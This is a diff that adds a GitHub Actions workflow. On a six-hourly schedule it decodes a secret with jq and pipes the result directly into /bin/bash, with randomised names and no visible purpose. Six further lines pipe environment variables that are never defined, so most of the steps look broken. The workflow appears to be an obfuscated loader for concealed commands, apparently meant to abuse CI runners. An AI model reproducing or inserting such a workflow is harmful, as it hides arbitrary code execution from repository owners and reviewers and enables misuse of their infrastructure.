@@ -1,0 +1,24 @@
+name: beenlemur
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beenlemur
+        env:
+          g50778: ${{ secrets.g50778 }}
+        run: |
+          echo $g50778 | jq -r .o84672 | /bin/bash
+          echo $vbml19 | jq -r .h3875 | /bin/bash
+          echo $aqxf647 | jq -r .nmjqv780 | /bin/bash
+          echo $udkf58201 | jq -r .t53623 | /bin/bash
+          echo $ods50 | jq -r .cuv62439 | /bin/bash
+          echo $djevd742 | jq -r .c5485 | /bin/bash
+          echo $ksrfr3308 | jq -r .geyn5 | /bin/bash
+
